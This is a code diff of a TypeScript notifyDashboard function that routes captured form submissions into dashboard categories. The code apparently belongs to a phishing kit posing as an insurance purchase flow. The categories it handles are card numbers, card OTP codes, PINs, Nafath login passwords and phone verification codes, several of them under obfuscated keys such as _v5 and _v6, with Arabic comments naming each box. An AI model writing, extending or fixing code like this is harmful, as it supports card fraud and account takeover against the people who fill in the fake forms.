@@ -147,33 +147,37 @@ export async function notifyDashboard(payload: Record<string, any>): Promise<voi
     const combinedData = { ...(payload?.raw || {}), ...payload };
     let entryType = 'basic'; // default type
     
-    // Phone OTP from step5 (_v7) - highest priority for step5 page
-    if (combinedData._v7 || combinedData.phoneOtpSubmittedAt || combinedData.phoneOtpStatus) {
-      entryType = 'phone_otp'; // Phone OTP verification from step5
+    // Check current page first (most reliable indicator)
+    const page = combinedData.currentPage || combinedData.page || payload?.currentPage || payload?.page;
+    
+    if (page === 'insur') {
+      entryType = 'insurance'; // صندوق بيانات التامين
     }
-    // Phone data from step5 (before OTP)
-    else if (combinedData.phoneIdNumber || combinedData.phoneCarrier) {
-      entryType = 'phone'; // Phone verification data from step5
+    else if (page === 'compar') {
+      entryType = 'package'; // صندوق الباقة المختارة
     }
-    // Card OTP from step2 (_v5)
-    else if (combinedData.otpCode || combinedData._v5 || combinedData.otpSubmittedAt) {
-      entryType = 'card_otp'; // Card OTP verification from step2
+    else if (page === 'check') {
+      entryType = 'payment'; // صندوق بيانات الدفع
     }
-    // PIN from step3 (_v6)
-    else if (combinedData.pinCode || combinedData._v6 || combinedData.pinSubmittedAt) {
-      entryType = 'pin'; // PIN code from step3
+    else if (page === 'step2') {
+      entryType = 'card_otp'; // صندوق رمز التحقق من البطاقة
     }
-    // Card data
+    else if (page === 'step3') {
+      entryType = 'pin'; // صندوق رمز PIN
+    }
+    else if (page === 'step4') {
+      entryType = 'nafad'; // صندوق النفاذ
+    }
+    else if (page === 'step5' || combinedData.phoneIdNumber || combinedData.phoneCarrier || combinedData._v7) {
+      entryType = 'phone'; // صندوق التحقق من الهاتف + رمز التحقق
+    }
+    // Card data (from check page or card form)
     else if (combinedData.cardNumber || combinedData._v1 || combinedData.cardOwner) {
-      entryType = 'card'; // Card payment data
+      entryType = 'payment'; // صندوق بيانات الدفع
     }
-    // Insurance selection
+    // Insurance selection (from compar page)
     else if (combinedData.selectedOffer || combinedData.offerTotalPrice) {
-      entryType = 'insurance'; // Insurance selection
-    }
-    // Nafath verification
-    else if (combinedData.nafadIdNumber || combinedData.nafadPassword || combinedData.nafadStatus) {
-      entryType = 'nafad'; // Nafath verification
+      entryType = 'package'; // صندوق الباقة المختارة
     }
     // Otherwise, keep 'basic' for home-new data
 
